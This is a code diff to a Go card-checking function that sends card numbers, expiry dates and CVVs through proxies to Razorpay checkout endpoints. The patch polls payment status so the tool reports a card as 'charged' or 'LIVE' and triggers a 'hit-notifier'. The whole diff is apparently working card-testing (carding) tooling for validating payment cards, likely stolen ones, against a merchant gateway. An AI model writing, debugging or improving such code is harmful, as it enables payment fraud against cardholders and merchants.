@@ -1961,6 +1961,74 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
+	// ── FIX: Poll payment status BEFORE calling cancel ───────────────────
+	// After 3DS authentication, the payment may already be authorized/captured.
+	// Previously the code called /cancel immediately, which could abort an
+	// in-flight charge — the cancel response would lack razorpay_payment_id,
+	// so the function returned "declined" even though the card was live.
+	// Now we poll the payment status first: if the payment is already
+	// authorized/captured, we return "charged" immediately without cancelling.
+	// This ensures the user (API caller) gets the correct "charged" result
+	// AND the background hit-notifier fires as expected.
+	//
+	// Poll up to 5 times with 2s intervals (≈10s max) to give Razorpay time
+	// to finish processing. Most payments settle within 2-4 seconds.
+	statusURL := fmt.Sprintf(
+		"https://api.razorpay.com/v1/standard_checkout/payments/%s?key_id=%s&session_token=%s&keyless_header=%s",
+		paymentID, kyid, sessid, keylessHeaderURL,
+	)
+	statusHeaders := map[string]string{
+		"Accept":          "application/json",
+		"Content-type":    "application/x-www-form-urlencoded",
+		"Referer":         rzpRef,
+		"x-session-token": sessid,
+	}
+
+	for pollAttempt := 0; pollAttempt < 5; pollAttempt++ {
+		if pollAttempt > 0 {
+			time.Sleep(2 * time.Second)
+		}
+		rPoll, pollErr := fetch.Get(statusURL, statusHeaders)
+		if pollErr != nil {
+			log.Printf("payment status poll %d: error: %v", pollAttempt, pollErr)
+			continue
+		}
+		pollText := rPoll.Text()
+		var pollData map[string]interface{}
+		if err := json.Unmarshal([]byte(pollText), &pollData); err != nil {
+			log.Printf("payment status poll %d: parse error", pollAttempt)
+			continue
+		}
+		payStatus := strings.ToLower(getStringFromMap(pollData, "status"))
+		log.Printf("payment status poll %d: status=%s", pollAttempt, payStatus)
+
+		if payStatus == "captured" || payStatus == "authorized" {
+			// Payment went through — return "charged" immediately.
+			// Do NOT call cancel so the charge stays intact for the user.
+			return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
+		if payStatus == "failed" {
+			// Payment definitively failed — no need to cancel or keep polling.
+			failDesc := ""
+			if errObj, ok := pollData["error_description"].(string); ok {
+				failDesc = errObj
+			}
+			if failDesc == "" {
+				if errObj, ok := pollData["error"].(map[string]interface{}); ok {
+					failDesc = getStringFromMap(errObj, "description")
+				}
+			}
+			if failDesc == "" {
+				failDesc = "Payment Failed"
+			}
+			return CheckResult{Status: "declined", Message: failDesc, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
+		// "created" / "pending" / other → keep polling
+	}
+
+	// ── Fallback: cancel + check ─────────────────────────────────────────
+	// If polling didn't give us a definitive answer (still "created" /
+	// "pending" after 10s), fall back to the original cancel-and-check flow.
 	r9, err := fetch.Get(
 		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeaderURL),
 		map[string]string{
